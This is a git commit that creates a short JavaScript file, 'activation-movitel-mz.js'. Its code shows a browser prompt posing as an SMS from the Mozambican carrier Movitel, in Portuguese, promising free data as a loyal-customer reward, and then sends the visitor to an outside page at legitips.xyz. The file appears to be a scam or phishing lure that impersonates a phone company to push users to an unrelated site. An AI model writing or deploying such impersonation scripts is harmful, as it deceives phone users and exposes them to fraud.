b7d81d16e8a30e77a2f4197c7c790353d282b28e
legitips <83867893+legitips@users.noreply.github.com>
2024-07-02 12:21:52 -0700

    Create activation-movitel-mz.js

---
+++ activation-movitel-mz.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('MOVITEL SMS: Prezado cliente, por favor verifique se o seu cartão SIM MOVITEL está qualificado para receber dados gratuitos, recompensa de clientes antigos, pressione 1 para verificar agora ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/movitel-mz.html';
+}
